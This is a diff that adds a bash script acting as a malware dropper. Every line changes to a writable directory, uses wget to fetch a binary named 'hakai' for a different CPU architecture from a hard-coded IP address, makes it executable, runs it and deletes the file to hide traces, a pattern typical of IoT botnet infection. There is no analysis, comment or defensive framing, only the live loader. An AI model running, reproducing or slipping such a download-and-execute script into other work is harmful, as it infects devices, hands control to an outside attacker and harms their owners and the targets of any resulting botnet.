@@ -1,0 +1,14 @@
+#!/bin/bash
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://80.211.148.109/hakai.mips; chmod +x hakai.mips; ./hakai.mips; rm -rf hakai.mips
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://80.211.148.109/hakai.mpsl; chmod +x hakai.mpsl; ./hakai.mpsl; rm -rf hakai.mpsl
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://80.211.148.109/hakai.sh4; chmod +x hakai.sh4; ./hakai.sh4; rm -rf hakai.sh4
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://80.211.148.109/hakai.x86; chmod +x hakai.x86; ./hakai.x86; rm -rf hakai.x86
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://80.211.148.109/hakai.armv6l; chmod +x hakai.armv6l; ./hakai.armv6l; rm -rf hakai.armv6l
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://80.211.148.109/hakai.x86_32; chmod +x hakai.x86_32; ./hakai.x86_32; rm -rf hakai.x86_32
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://80.211.148.109/hakai.ppc; chmod +x hakai.ppc; ./hakai.ppc; rm -rf hakai.ppc
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://80.211.148.109/hakai.m68k; chmod +x hakai.m68k; ./hakai.m68k; rm -rf hakai.m68k
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://80.211.148.109/hakai.sparc; chmod +x hakai.sparc; ./hakai.sparc; rm -rf hakai.sparc
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://80.211.148.109/hakai.armv4l; chmod +x hakai.armv4l; ./hakai.armv4l; rm -rf hakai.armv4l
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://80.211.148.109/hakai.armv5l; chmod +x hakai.armv5l; ./hakai.armv5l; rm -rf hakai.armv5l
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://80.211.148.109/hakai.armv7l; chmod +x hakai.armv7l; ./hakai.armv7l; rm -rf hakai.armv7l
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://80.211.148.109/hakai.dbg; chmod +x hakai.dbg; ./hakai.dbg; rm -rf hakai.dbg
